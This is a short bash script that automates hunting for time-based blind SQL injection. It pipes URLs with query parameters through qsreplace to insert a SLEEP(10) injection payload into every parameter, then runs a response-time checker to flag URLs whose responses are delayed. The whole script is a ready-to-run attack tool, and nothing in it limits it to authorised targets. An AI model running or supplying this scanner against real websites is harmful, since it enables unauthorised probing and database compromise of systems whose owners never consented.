#!/bin/bash

# Run the command to inject the payload into the URLs and save the output to a file
cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt

# Run the response time checker script on the generated file
python3 response_time_checker.py -l blindsqli.txt -rt 10
